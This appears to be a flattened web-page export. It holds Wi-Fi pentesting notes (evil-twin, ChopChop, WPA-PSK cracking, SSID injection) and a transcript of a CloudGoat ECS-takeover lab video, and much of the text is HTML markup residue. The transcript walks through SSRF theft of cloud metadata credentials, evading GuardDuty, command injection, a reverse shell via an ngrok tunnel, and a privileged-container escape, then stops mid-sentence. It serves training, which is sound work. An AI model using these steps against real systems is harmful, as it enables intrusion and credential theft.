style width 692px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 209 png a figure li ul h2 id b5d00a7c-4da7-4857-8634-70715e2be29f class Caffe Latte Attack h2 ul id f7c110c7-7a41-43c8-a47e-d731a60bdcf2 class bulleted-list li style list-style-type disc this scenario assumes that the regular AP on which the client connects to contains a WEP key in its PNL li ul ol type 1 id 0291d44b-1728-4759-bfa9-3c2e8ee9ec19 class numbered-list start 1 li set up AP evil twin and deauth client li ol ol type 1 id c0a8b5c5-01e8-4cc5-a2d1-45d7196bc307 class numbered-list start 2 li client tries to reconnect to AP with same SSID and highest signal strength li ol ol type 1 id ad129745-d9a8-4eb1-97df-7e04e77e8d1a class numbered-list start 3 li WEP key sent by client to malicious AP li ol ol type 1 id a295268d-213f-4a81-be94-16b97816d322 class numbered-list start 4 li malicious AP accepts all WEP keys and grants authentication li ol h2 id bd10e671-30df-4ea1-a99e-f34ac1b497cd class Korek x27 s ChopChop h2 ul id 06ea7030-019d-4b70-a47e-e8835c2a3de6 class bulleted-list li style list-style-type disc last byte of encrypted data packet is chopped off The byte of the data is then guessed and ICV is calculated If guess is correct ICV matches and encrypted data is accepted ul id 40988e6e-ac84-4b94-957c-1324f0a721ce class bulleted-list li style list-style-type circle process is repeated for all the bytes of the encrypted packet to obtain the full packet li ul figure id f425e626-666f-430b-bd87-0351f1df715c class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2010 png img style width 668px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2010 png a figure li ul h1 id d5a22266-1a81-4119-9e6f-b2196fb6977b class Wi-Fi Gear h1 h2 id e34f6b01-274b-48f9-a72e-8b9f9bfcc649 class External Wireless Card h2 ul id de925059-4292-4a75-ab40-8faec71b22f9 class bulleted-list li style list-style-type disc allows for packet sniffing and packet injection li ul ul id c04fedc4-517c-422d-bc0a-780559b9114e class bulleted-list li style list-style-type disc wireless cards can only be on one channel at a time Wi-Fi Sniffing li ul ul id 807fc4cb-2e0c-4cd3-bb57-52d894ce13db class bulleted-list li style list-style-type disc WLANS operate in 3 different frequencies ol type 1 id a4609e78-419e-4cf5-ba12-94b5f6ce2e5d class numbered-list start 1 li 2 4 GHz 802 11b g n li ol ol type 1 id e7b2e3a2-65ea-4531-9b8f-0ac69d316dd4 class numbered-list start 2 li 3 6 GHz 802 11y li ol ol type 1 id 3a3f0e57-bb25-473d-b36e-bc4d52189f7f class numbered-list start 3 li 3 9 5 0 GHz 802 11a h j n li ol li ul ul id c2fcabb1-4bd6-4502-b810-556f701969d3 class bulleted-list li style list-style-type disc 3 types of WLAN packets ol type 1 id 62fe315c-c9e1-41ac-abdc-7caf782f47ff class numbered-list start 1 li Management li ol ol type 1 id 09546dca-295a-48b1-b342-fe22e43e545c class numbered-list start 2 li Control li ol ol type 1 id bf860c86-e900-41ec-b8d2-10e640f1ab20 class numbered-list start 3 li Data li ol li ul h1 id 5dd9e72e-5c7e-4d47-8794-67cbec35470e class WLAN Headers h1 h2 id c21a9d2d-a7fb-433d-95e1-605c25f3b6fb class Terminology h2 p id f971752e-b308-4c7b-81bb-c29c97ce9417 class span style border-bottom 0 05em solid Ad Hoc Network span p ul id 6af8f5b0-f4ee-41d6-bf89-fac9a5f35be1 class bulleted-list li style list-style-type disc decentralized network li ul ul id e2c9014e-ef18-4d98-a392-ead2e67a1692 class bulleted-list li style list-style-type disc devices communicate directly with each other instead of using bridge e g access point li ul ul id 9be6c17d-b700-4aea-a0aa-b03f34364f13 class bulleted-list li style list-style-type disc communicates peer to peer which is why ad hoc is also called peer to peer mode li ul ul id 764c13de-60f5-461c-acdd-2106b366f1bf class bulleted-list li style list-style-type disc cheap and quick but performance decreases as more users join network li ul ul id 7ff076fe-94d2-487b-bb2d-8184200a624d class bulleted-list li style list-style-type disc can have some security risks li ul p id 45d600c7-2ab1-458d-8cb6-3bcff4772126 class span style border-bottom 0 05em solid Infrastructure Network span p ul id c9419a2d-dc34-4349-a68a-cce5557fce71 class bulleted-list li style list-style-type disc communicate with access point typically covers between 100 to 200 feet li ul ul id 18429dc8-9183-4062-a2ff-f66b1562f3d5 class bulleted-list li style list-style-type disc centralized network li ul ul id 852fa3f0-4718-4bcc-8717-adb669e48e3f class bulleted-list li style list-style-type disc requires constant administration li ul p id fc0eda7b-3bc7-4590-bc64-9d89df442b38 class span style border-bottom 0 05em solid STA span STAtion wireless client span style border-bottom 0 05em solid BSS span set of wireless client nodes communicating with each other p ul id 16da4f93-6e02-4e6a-889c-d19871305891 class bulleted-list li style list-style-type disc two types li ul ul id a5c71920-bf09-4c91-bee5-afa0bea53cd2 class bulleted-list li style list-style-type disc infrastructure BSS AP and clients li ul ul id e9722a73-6d4d-4fe1-bac2-7482ef9a597b class bulleted-list li style list-style-type disc independent BSS Ad-Hoc Client li ul figure id 3f6f10c7-de16-4c23-ae58-6a40ec30143e class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2011 png img style width 688px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2011 png a figure p id 96743fdd-c422-4f88-bb22-69bd06293996 class span style border-bottom 0 05em solid ESS span set of connected BSSs span style border-bottom 0 05em solid BSSID span p ul id 98c49231-2abc-45fe-9a30-79f7bf3be622 class bulleted-list li style list-style-type disc basic service set identifier li ul ul id 5ba744fc-ec9d-4112-833c-36c98add0279 class bulleted-list li style list-style-type disc in the case of an infrastructure BSS it is the MAC address of AP li ul ul id d85aa5a7-8c61-420e-b5a5-fb51b15c6119 class bulleted-list li style list-style-type disc in the case of an IBSS independent BSS it is the randomly chosen MAC address li ul p id 2ffedfc8-ebc1-449a-981e-f4e5c45faf62 class span style border-bottom 0 05em solid Distribution System DSU span connects APs in an ESS p h2 id 2a57f38a-69fc-4ae6-9131-c17d691c2452 class WLAN Packet Header h2 h3 id 6ee5195a-7ecd-416e-bc49-d8f9f7ad72bd class Frame Control Field h3 ul id e60e7da3-d244-49c4-8a97-ba6f13c958d9 class bulleted-list li style list-style-type disc header starts at frame control which is two bytes as opposed to two bits li ul figure id 7671ba78-0888-4d96-b360-66b3754c6936 class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2012 png img style width 682px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2012 png a figure p id 65111c8f-fdbe-4aa4-9fda-55fc3018fc94 class span style border-bottom 0 05em solid Protocol span p ul id d90e0fbd-6f10-4a83-b1d2-74b10c21dba3 class bulleted-list li style list-style-type disc default to 0 value may change when a major revision is incompatible with a previous version li ul p id 1f2f8ae3-4785-4545-a6a0-4d67e0e36a82 class span style border-bottom 0 05em solid Type and Sub Type span p ul id 4a1c4246-15ae-49cc-af12-42265b4874da class bulleted-list li style list-style-type disc type ul id a9e66be7-67cf-40a0-bd48-779a0a36afa9 class bulleted-list li style list-style-type circle management control and data frames each one of these has a sub type ul id 4d8bb9cb-56e2-4192-94ce-013ae702331e class bulleted-list li style list-style-type square note each one of these fields is a bit li ul li ul li ul p id b1ea7d0c-2788-4544-8fe8-5d7d51a3bf93 class span style border-bottom 0 05em solid To and From DS span p p id 0759ab1c-d1ed-4780-b3bf-2759f4b492cd class span style border-bottom 0 05em solid Retry Bit span p ul id f1c4c672-288f-4623-8d30-f3ea03c3579a class bulleted-list li style list-style-type disc retry bit indicates if current frame is a retransmission li ul ul id a938524e-1ae2-450a-89f7-6fc3aa72738a class bulleted-list li style list-style-type disc applicable only to management and data frames li ul p id e2299b0c-c540-413b-84b1-7da1ed5ff5eb class span style border-bottom 0 05em solid Power Management span p ul id e36f087b-fb92-4279-90b8-c103b2bc968e class bulleted-list li style list-style-type disc indicates if STA is in power save mode or active mode li ul p id a5e3bd5a-6530-4a8c-aa08-28ffe907c631 class span style border-bottom 0 05em solid More Data span p ul id 09d77f9c-d88e-4fa8-bcfa-425df68ca4e5 class bulleted-list li style list-style-type disc indicates to STA in power save mode that more data is to follow ul id 9d497901-e009-4be8-b23a-3c68f458bdfd class bulleted-list li style list-style-type circle such as in situations when data is to be sent but sender is low on battery li ul li ul ul id 68cd7369-080b-4090-b5d7-f02f58d7c02b class bulleted-list li style list-style-type disc data is queued up on AP li ul p id 610b98ac-30d6-4254-b51d-bab84299ede5 class span style border-bottom 0 05em solid Protected Frame span p ul id a5ddb4cc-158c-435f-8ee5-0db76a71f7ba class bulleted-list li style list-style-type disc 1 indicates Frame Body is encrypted ul id cf535a5e-8cfd-49cd-86df-5833c56ea3fd class bulleted-list li style list-style-type circle applicable to data frames and management frames of type authentication li ul li ul ul id bb6c60cb-a0fe-4a3c-b85d-b8ed139a6af1 class bulleted-list li style list-style-type disc 0 indicates no encryption li ul p id a8adde8b-98a6-47fe-9d49-a54a6b797169 class span style border-bottom 0 05em solid Order span p ul id f6fe9e43-8a33-42ac-8d34-cbb45275c748 class bulleted-list li style list-style-type disc indicates that all received frames must be processed in order li ul h3 id 3335e111-f41c-4d98-8990-4667682c907d class Duration ID h3 ul id 7e8d3ad1-7639-49c2-ae5b-73007b9ab1ab class bulleted-list li style list-style-type disc slash is there to indicate that this field could be used either as a duration field or ID field li ul ul id b51674e7-713f-4a97-8b18-9085d9a93929 class bulleted-list li style list-style-type disc duration field used to set Network Allocation Vector NAV ul id aecc2897-64b0-46da-809c-fa868a6a923f class bulleted-list li style list-style-type circle NAV is the minimum amount of time a STA needs to wait before attempting transmission li ul li ul h3 id 47116a5d-b4f6-414c-b0c4-ffeb1a358cdf class Address 1-4 h3 ul id b3e1397b-f16d-48c6-912a-c9a8a62ffa1d class bulleted-list li style list-style-type disc WLAN has more than one address ul id a25b18e2-1370-404f-8c6a-a2240f003938 class bulleted-list li style list-style-type circle Source Address li ul ul id d02e3440-e2b6-4db0-97fa-e6be97de43e5 class bulleted-list li style list-style-type circle Destination Address li ul ul id 8cdbe45d-dbe5-4ff4-af65-9a244a3e1d05 class bulleted-list li style list-style-type circle BSSID li ul ul id 61ec382f-c18e-4176-b3ff-d3d72b98e070 class bulleted-list li style list-style-type circle Address 4 is used in a WDS li ul li ul ul id 4149ceb7-0ebe-4073-9bb4-71d6112acccc class bulleted-list li style list-style-type disc value and presence of addresses 2-4 depend on type subtype li ul h3 id 7c4edaf1-62f9-4ad8-9f1a-bec30c6e11b3 class Sequence Control h3 ul id b94e152f-31d3-4001-8d87-cb04b000bc50 class bulleted-list li style list-style-type disc broken up into two fields ol type 1 id 628fde25-e955-4c87-aada-59d23c831312 class numbered-list start 1 li Sequence number of packet ul id 74093e4b-e83f-4bbf-aae4-ddb78cb9c2ad class bulleted-list li style list-style-type disc number of packet transmitted by wireless entity li ul ul id c6f07cc4-6afa-45a3-a9ed-73fda12c32e5 class bulleted-list li style list-style-type disc a href https www youtube com watch v BWILgDt6jz0 Sequence Number a li ul li ol ol type 1 id 7c4d97fc-c1e7-4406-90b7-49b56d0c7d1c class numbered-list start 2 li Fragment number of packet ul id a63ccb17-df7f-438a-a17f-bf2963aaa728 class bulleted-list li style list-style-type disc which fragment is current frame of larger packet if applicable li ul li ol li ul h3 id aec44b3b-d234-46f3-a254-11ba63328aa5 class QOS Control h3 ul id 21701b92-d2d2-4396-a527-9e30fc4d01fb class bulleted-list li style list-style-type disc quality of service related li ul h3 id 9e133d71-2f6b-42e5-864c-b9ef650b9036 class Frame Body h3 ul id b81b7e62-db95-4952-8bad-07731f6f2cc8 class bulleted-list li style list-style-type disc contains data payload ul id 3b1c3991-e74d-4c7d-a437-e95ce834dbe6 class bulleted-list li style list-style-type circle can contain management subheader of packet li ul li ul ul id 6347dc88-708b-4754-b61f-9b4474b5f8bf class bulleted-list li style list-style-type disc consists of Logical-Link Control LLC and Address Resolution Protocol ARP li ul h3 id 14549fe5-8bde-41a3-b8d1-75b516f49b90 class FCS h3 ul id 525a24ff-c177-4dda-a4fe-e83c3d9b31c7 class bulleted-list li style list-style-type disc Cyclic Redundancy Check CRC over MAC header and Frame Body ul id 2fa62a57-c450-4ab5-8b17-f7a564d16f4d class bulleted-list li style list-style-type circle detects accidental changes to raw data li ul li ul ul id 84921975-b5c2-4d44-9dff-00ec14f43233 class bulleted-list li style list-style-type disc 4 bytes li ul h1 id 3ccad7d1-ca6f-4022-bb8d-83c48674b86c class WPA2 -PSK h1 ul id 03c259bd-cfc4-44d8-86ea-8ae46355ef40 class bulleted-list li style list-style-type disc encryption algorithm in the probe response li ul ul id 19083610-79f1-4a1b-bb5d-10e25ee602f2 class bulleted-list li style list-style-type disc method of cracking is the same as in WPA-PSK ul id 96dff5e5-4d3f-44b8-a9ec-21b9757489fb class bulleted-list li style list-style-type circle just as vulnerable as WPA-PSK if weak password is chosen li ul li ul h1 id c0139b76-48d0-4690-993d-8f0a0537c497 class WPA-PSK h1 ul id ac5491a2-e589-4d70-be78-5ae399ac064d class bulleted-list li style list-style-type disc used for personal use typically li ul ul id b1660c0e-896d-452a-acf9-626b585a1b5f class bulleted-list li style list-style-type disc based on WEP li ul ul id e00a5d8c-0275-4990-8a44-e11d9dad2730 class bulleted-list li style list-style-type disc uses TKIP encryption method li ul ul id 919023aa-65c7-406c-be35-76183b649c8f class bulleted-list li style list-style-type disc personal networks typically use PSK while enterprise uses 802 1x Radius span style border-bottom 0 05em solid PTK Pairwise Transit Key span li ul ul id 2cc9e9f1-31ff-477b-96a5-6858a0261483 class bulleted-list li style list-style-type disc used for encryption of packets between client and AP li ul p id 3b4bdc0c-4296-4ecc-926c-002e80e870d8 class style import url https cdnjs cloudflare com ajax libs KaTeX 0 13 2 katex min css style span data-token-index 0 contenteditable false class notion-text-equation-token style user-select all -webkit-user-select all -moz-user-select all span span span span class katex span class katex-mathml math xmlns http www w3 org 1998 Math MathML semantics mrow mi P mi mi T mi mi K mi mo mo mi P mi mi M mi mi K mi mo mo mi A mi mi N mi mi O mi mi N mi mi C mi mi E mi mo mo mi S mi mi N mi mi O mi mi N mi mi C mi mi E mi mo mo mi M mi mi A mi mi C mi mo stretchy false mo mi A mi mi A mi mo stretchy false mo mo mo mi M mi mi A mi mi C mi mo stretchy false mo mi S mi mi A mi mo stretchy false mo mrow annotation encoding application x-tex PTK PMK ANONCE SNONCE MAC AA MAC SA annotation semantics math span span class katex-html aria-hidden true span class base span class strut style height 0 68333em vertical-align 0em span span class mord mathnormal style margin-right 0 13889em PT span span class mord mathnormal style margin-right 0 07153em K span span class mspace style margin-right 0 2777777777777778em span span class mrel span span class mspace style margin-right 0 2777777777777778em span span span class base span class strut style height 0 76666em vertical-align -0 08333em span span class mord mathnormal style margin-right 0 10903em PM span span class mord mathnormal style margin-right 0 07153em K span span class mspace style margin-right 0 2222222222222222em span span class mbin span span class mspace style margin-right 0 2222222222222222em span span span class base span class strut style height 0 76666em vertical-align -0 08333em span span class mord mathnormal A span span class mord mathnormal style margin-right 0 05764em NONCE span span class mspace style margin-right 0 2222222222222222em span span class mbin span span class mspace style margin-right 0 2222222222222222em span span span class base span class strut style height 0 76666em vertical-align -0 08333em span span class mord mathnormal style margin-right 0 05764em SNONCE span span class mspace style margin-right 0 2222222222222222em span span class mbin span span class mspace style margin-right 0 2222222222222222em span span span class base span class strut style height 1em vertical-align -0 25em span span class mord mathnormal style margin-right 0 10903em M span span class mord mathnormal A span span class mord mathnormal style margin-right 0 07153em C span span class mopen span span class mord mathnormal AA span span class mclose span span class mspace style margin-right 0 2222222222222222em span span class mbin span span class mspace style margin-right 0 2222222222222222em span span span class base span class strut style height 1em vertical-align -0 25em span span class mord mathnormal style margin-right 0 10903em M span span class mord mathnormal A span span class mord mathnormal style margin-right 0 07153em C span span class mopen span span class mord mathnormal style margin-right 0 05764em S span span class mord mathnormal A span span class mclose span span span span span span span span p ul id 74dc088f-ae80-4641-8690-77067dffe8a6 class bulleted-list li style list-style-type disc PMK Pairwise Master Key comprised of SSID and passphrase li ul ul id eb21008a-f799-43a3-acac-3403abae2dd2 class bulleted-list li style list-style-type disc ANONCE random number AP has made ul id b833d159-b89b-48c2-aa7d-dee8fd4d547a class bulleted-list li style list-style-type circle present in packets 1 and 3 li ul li ul ul id 3209136a-0c51-40e6-9074-06d1e289600e class bulleted-list li style list-style-type disc SNONCE random number client has made ul id 9cbbef32-5d90-4b7d-9ece-81137d1b24d6 class bulleted-list li style list-style-type circle present in packet 2 li ul li ul ul id 8a4e43c1-9aa4-449c-be80-bd4f26a55fe6 class bulleted-list li style list-style-type disc MAC AA MAC address of AP authenticator li ul ul id 064d9a58-e231-4910-95db-5beb7fbadd40 class bulleted-list li style list-style-type disc MAC SA MAC address of client supplicant ul id efa5aff4-d1a9-46fc-a011-735b8c8d1283 class bulleted-list li style list-style-type circle MAC AA and MAC SA present in all packets li ul li ul h2 id cb984586-4d96-487e-9ebc-01fa3926ccfe class Cracking WPA-PSK h2 h3 id 323bda25-24c4-452a-ae07-d94118ff2034 class Dictionary Attack h3 figure id 5ff53d53-656f-4747-956d-61765138970e class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2013 png img style width 692px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2013 png a figure ul id cfab77a2-a3a0-4bb8-8a8f-36b96b09db3d class bulleted-list li style list-style-type disc reconstruct the MIC using the PTK if MIC matches the one in packet then the PTK is correct and the passphrase was successfully guessed span style border-bottom 0 05em solid MIC Message Integrity Code span Value dependent on following parameters ol type 1 id cd03405b-53fc-4b6a-90d1-d6ea7f0daa76 class numbered-list start 1 li message body li ol ol type 1 id 04c0bf01-f979-4def-ac00-f53a7d0afc17 class numbered-list start 2 li PTK li ol li ul h2 id 59cc6f47-63c4-4218-bc8a-e39871d52daf class Keys h2 pre id f9b29285-6fb6-467a-9a01-9ba660ff1df3 class code code-wrap code usr bin env python from pbkdf2 import PBKDF2 ssid raw input x27 SSID x27 passphrase raw input x27 Passphrase x27 print quot Pairwise Master Key quot PBKDF2 passphrase ssid 4096 read 32 encode quot hex quot code pre ul id 7d69cb1a-8daa-4175-a257-590dbc292dd4 class bulleted-list li style list-style-type disc PBKDF2 takes in the following five parameters ol type 1 id d8bb94bd-19c9-484b-8502-0b976223f64e class numbered-list start 1 li Passphrase li ol ol type 1 id aed4bacf-70ee-4c8e-8165-79608258e805 class numbered-list start 2 li SSID of AP li ol ol type 1 id 2efe1916-605d-485b-96a2-13346ab2dd90 class numbered-list start 3 li SSID length li ol ol type 1 id 87fd9714-22a1-4ea7-b5aa-b56646bdb3f1 class numbered-list start 4 li 4096 - number of times passphrase is hashed li ol ol type 1 id b3003433-bee9-4f2a-894e-fc70648a44f8 class numbered-list start 5 li 256 - intended key length of PSK in bits li ol li ul ul id 15292681-618e-43fb-a97c-385e47fec3d7 class bulleted-list li style list-style-type disc WPA uses dynamic keys for encryption ul id 420b2cd0-7511-400f-bcab-f73427ea215d class bulleted-list li style list-style-type circle keys generated on per connection basis li ul li ul ul id a1de7796-1d53-4fde-9800-5e9001a1164f class bulleted-list li style list-style-type disc in WPA and WPA2 personal the PSK and PMK is the same li ul h3 id 54ef2dc6-b68c-40c1-81af-3ec69131243a class WPA-PSK Authentication Further Explanation h3 figure id 2d29d392-4428-4bea-a766-0ab496a81b41 class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2014 png img style width 695px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2014 png a figure ol type 1 id aeaf7832-8c83-4bbc-9e23-afed539a7710 class numbered-list start 1 li Supplicant enters password and through the password a PSK is derived ul id 8fdd842c-8186-4d17-8d5c-bd0d4b19cce9 class bulleted-list li style list-style-type disc note AP already has a PSK because AP knows its own password li ul li ol ol type 1 id e9de9878-29cf-43b2-8297-4dbc7e19a6c3 class numbered-list start 2 li AP sends to supplicant ANounce li ol ol type 1 id e81f9888-304a-4c30-916d-19c11de3b86b class numbered-list start 3 li Client uses ANounce and its own SNounce to generate PTK and MIC SNounce and MIC is then sent to AP li ol ol type 1 id 1bed28e5-8355-4576-aa4a-1326bdefb7da class numbered-list start 4 li AP uses the added SNounce information to generate the MIC and PTK and checks if the generated MIC matches the one that the client sent li ol ol type 1 id 3a661cdc-ad3c-4742-aed8-4a5ec7baafab class numbered-list start 5 li If matches the AP sends a key installation message to the supplicant and data transfer starts Otherwise the supplicant is deauthenticated li ol ol type 1 id 39a786ca-d654-4844-a5a7-80fdc15dee31 class numbered-list start 6 li Supplicant installs key and sends key acknowledgement to AP li ol table id fdb4c517-92a4-4737-ac1c-3dd18705b5e0 class simple-table tbody tbody table h1 id e6e96896-eedf-4950-9fa6-a9dda8fadfa0 class Detecting Spoofing Attacks h1 h2 id 66ca8987-f182-4f19-bcca-2a5bec020e04 class SSID Spoofing h2 ul id 225f78f4-4b45-4693-aaa9-cfbb3017a5dc class bulleted-list li style list-style-type disc when not spoofing the mac address you can see multiple MAC addresses broadcasting the same SSID ul id ee335be5-3306-4035-87be-7f88b528a94e class bulleted-list li style list-style-type circle not necessarily malicious such as if a business has multiple access points with the same name and would like to allow a client to roam around a building without having to manually reconnect to other APs li ul ul id 7a24defb-d6e1-40da-9620-9ccc31e587e9 class bulleted-list li style list-style-type circle if the MAC address is not in a list of authorized MAC addresses then it might be malicious this only works if the attacker did not spoof the MAC address li ul li ul ul id 28d4a6b8-24e9-4d7b-82d0-4fe53ef4587c class bulleted-list li style list-style-type disc could potentially be detected by monitoring the power usage of the real AP versus the potential rogue APs li ul h2 id 8924ea08-d242-4547-af07-cadb07e098d8 class Mac Spoofing h2 ul id 0f740d03-b1b7-4c4c-8d94-543eca510f98 class bulleted-list li style list-style-type disc could still be detected if the length of beacon frames from the legitimate AP and illegitimate AP differ ul id d3181acf-1a7a-44ba-a91f-f91d2a1b5fd1 class bulleted-list li style list-style-type circle the rogue AP will have the bare minimum information in the beacon frames and will typically be less in length than the legitimate AP li ul li ul ul id 0468a2ea-038e-4529-a885-8a134ab3c09e class bulleted-list li style list-style-type disc this could still in theory be bypassed by cloning the beacon frames however there is no known tool as far as I know that does this ul id 9597074a-3b11-4e8a-b8b9-e121c5c5ee00 class bulleted-list li style list-style-type circle note that air -ng does not perform this feature li ul li ul ul id a6adf3a6-e71d-4bab-ac7d-5879ff1899f6 class bulleted-list li style list-style-type disc sequence numbers between the rogue and legitimate AP differ typically by a lot e g rogue 324 and counting while legitimate 1235 and counting li ul h1 id 25884ae3-b113-4ab6-98cf-59c6643b7492 class Wireless IDS and IPS h1 ul id 50f78baa-eaa7-4f24-86c7-4083ba06bf13 class bulleted-list li style list-style-type disc the IDS and IPS detect when a client connects to an unauthorized AP in which case it sends a deauth packet to the client to disconnect it ol type 1 id edfd592e-483a-44e6-b8a6-cac6d60ba5bc class numbered-list start 1 li This can be sort of circumvented by creating multiple rogue APs across multiple channels li ol ol type 1 id 4387fe30-ac8b-45d3-82e7-8da6697ef735 class numbered-list start 2 li When the client gets disconnected from the rogue AP it searches for another AP with the same ESSID and automatically connects to it li ol li ul ul id 518eacc4-8acf-4771-926d-5fcec8f54f63 class bulleted-list li style list-style-type disc typically channels 1 6 and 11 are good channels to use as they do not overlap each other figure id a59e572f-ad0e-4ff4-8082-056a34313885 class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2015 png img src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 2015 png a figure p id 082798a5-c555-446d-8feb-8f0a85af0e8a class p li ul h1 id dbe474d1-e3f2-49e2-9432-323071ef92ef class Malicious SSID h1 h2 id 0462bf13-21d3-47d5-9fd9-47cc33e313a4 class HTML Injection and XSS h2 ul id ed547db2-1281-410c-a147-f2d7035d9e77 class bulleted-list li style list-style-type disc insecure web consoles displaying SSID names could potentially be vulnerable to SSIDs with injected HTML code li ul h2 id 56901a54-d79d-4327-a07a-f1494e13a424 class SQLi h2 ul id d7a445c2-e3ce-4744-9c27-75b9a1b45346 class bulleted-list li style list-style-type disc an SQLi statement can be put as the ESSID to cause a monitoring device to reboot or to delete all entries in a database li ul p id 648e7699-7b3e-489b-a09e-72e03f1df93a class p p id 6f9f6c91-dd6b-48a3-8c2f-8e9bcaf38108 class p div article body html",
				"image": "/images/wifi.jpg"
		},
    {
      "title"    : "Hacking in the Cloud - Cloudgoat: ecs_takeover",
      "category" : "Videos",
      "tags"     : "Videos, AWS, EC2, ECS, RCE",
      "url"      : "/videos/2022/12/10/ECS-Takeover/",
      "date"     : "Dec 10, 2022",
      "content"  : "hello everybody this is your day and this is the ECS takeover scenario in the cloud goat series the scenario starts off with just a public DNS name exposed to us it s just a website hosted on a privileged container so when we find that there is an rce vulnerability in the site we can then gain a reverse shell and then once we are inside of the container we can escape out of it because it s privileged in the scenario there s actually two different ec2 instances in the environment and the ec2 instance that we did not compromise contains a container called Vault so all we have to do is just update that task we just drain it and the task gets migrated over to our ec2 instance where we can then execute commands within that container and gain the sensitive files of that container so let s check it out we were provided the public DNS name of the target but before browsing over to that let s configure our c-line engagement so we could do that with set Dash engagement and then put in our engagement name of ECS takeover so now let s go and navigate to this with our web browser here and we ll go put this in here and now we have this website cloner so we have this cloner clone URL header here and this URL form so I suppose it s looking for some sort of URL that we need to input Let s uh input uh my website 0xd4y com and we see the HTML of the website uh what if we try like some sort of ssrf like 169 254 169 254 and that works so we do have an ssrf vulnerability here so we can get the metadata just like this do IAM security Dash credentials and here we have the role associated with this instance so let s get this roll here do slash input this role and now we have the access key the secret key and the token so let s start configuring this so AWS configure profile let s call it ec2 we have this little warning here given by the AWS C line tool it detects that we are running a pen testing distro when we run an API call in AWS it logs our user agent and our user agent contains our parrot OS so that will trigger guard Duty so before doing anything even though AWS configure is not an API call to this account we can just configure our set our user agent really quick by setting it so let s put in our engagement and I guess let s do this default engagement user agent here so now let s configure our profile let s put in the access key and the secret access key and let s also put in the token so AWS session token equals all of this and yeah it s gonna be really really long here so let s just keep on copying and being be patient it s a very long line here all right copy put all of that in and let s hope that it was all copied correctly so AWS STS get Dash Color dash identity and just so you know when we re going to be running this we re going to be triggering guard Duty with a credential exfiltration finding but we won t worry too much about being stealthy for this scenario there s a lot to go over in the scenario so it does work we did correctly put in the credentials let s see if we can do anything what if can we describe the instances with this profile ec2 and let s put in our region of us-east-1 and we can t even do that so what about S3 profile of ec2 and we get an access denied error so it s very likely that the role is just not that highly privileged we don t know too much about this role yet I doubt it has any IAM permissions but if we play around with this application a little bit more we see this URL here per this parameter maybe there was some sort of remote code execution that we can do so let s do some tests let s see what happens here failed to clone website but if we do test semicolon who am I we see that we do have code execution as it outputs root so let s go and try to get a reverse shell so a while back I actually created a tool called rev shell it s a tool that allows you to get a reverse shell just by using your own terminal I ll put a link to that in the description below it s like the default first tool that any penetration tester does so let s let s put in our our Port but actually before we know which Port we want in order to get this reverse shell we will need a public IP address and we can do that with NG rock or ngrok so we re going to do ngrok TCP 4444 and just enter that here and so we can see that what will happen is any request made to this 4 tcp nguk io on this port gets forwarded to our localhost 4444 so we want to put our Port as 16495 because that s what s shown right here and we want to put our IP as 4 TCP ngrok io and now let s enter that it says please specify valid IP address or interface when I was creating this tool I had ctfs in mind where you re connected to some sort of VPN so let s just do Force to ensure that anything is allowed so this is the payload that we re going to be using let s do Dash C so it s copied to our clipboard and now let s put that in here test and paste that in and before we run that let s spin up a listener here on Port 4444 so basically what s going to happen and we see it hanging so it s a good sign and here s the reverse shell basically what happened is the payload got sent to this location and this got forwarded to our 444 Port which is how we caught the reverse cell here let s see how that worked so let s go to main go which is where the website s code is and we can see here just loading up the application but over here is the really interesting part it clones the website by executing the command bin sh Dash C curl and then whatever the user inputs so it was easy for us to just put a semicolon and then some sort of command and then just like that we get remote code execution so let s go back to our reverse shell here and as you can see we re root let s do LS so it says Docker file are we within a docker container and we are we d see dot Docker end so let s do Docker PS to see what other Docker containers there are and to see if the host Docker socket is mounted onto this container and it actually is as we can see here we have the volume site uh container ID this is our own container ID and we can see some other containers here this one s called priv D maybe for privileged and we have the ECS agent which is not that interesting um it s just used to allow container instances to connect to your clusters so it s just kind of a regular agent that you would typically see when running Docker containers uh within the ECS so this real this is really interesting here with the priv D uh let s see if we re perhaps maybe we re in a privileged container our ourselves and maybe that way we can actually Escape out of our container and go into the host instance so there are multiple tools out there that you can see that will just run this for you so we go GitHub uh GitHub and Docker Escape tool there s multiple ones here let s choose this one here and we have this Escape tool so let s copy and we have wgets we do so let s do W get this change mod plus X Docker Dash Escape now when we run this tool we re actually going to be kicked out of our our reverse cell it s not very stable I could just show that here just outputs all of this and then we get kicked out but if we look here we see that there is this check to see determine if the environment is a Docker container but one of the things that it does does not say here in the description but if you write Docker Escape check it will see if you can actually Escape out of your container and if you can it creates its own privileged container and that way you can escape out into and go into the host instance so let s just get our reverse shell back really quickly so let s do let s run this again submit and go back into root so Docker Dash Escape check so it s creating a container and it started the privileged container and now whatever command we run uh we can run on the host so if we do uh nc-lvnp 4444 and let s go back to our rev shell tool let s see if we have uh do we have NC here no NC say probably Bash so we have bash so let s do rev shell Dash T bash and this is what the command actually looks like so let s put this in and now we are into the host so who am I and we go into here and we see ls-l-a and that s it another thing that we could do to see if it was even possible to escape out of the container so if we look here now there s this new container here um this is the privileged container it s named thirsty underscore Lehman uh but if we go here or was it yeah this was the container we just copy that and we do Docker inspect and we put this in we can see a lot of different parameters with this container one of them is this parameter called privileged and we can see that privileged is set to true so the website was running on a container instance was running within a container instance that was privileged and you can escape out of privileged containers so that s exactly what we did here but anyways uh let s check out this other uh container here this privileged one let s see if we can run any commands in it so Docker exec SSH does c who am I uh and I forgot to specify the container ID here so container ID here sh c who am I and we see roots so let s try doing a couple of things let s try getting 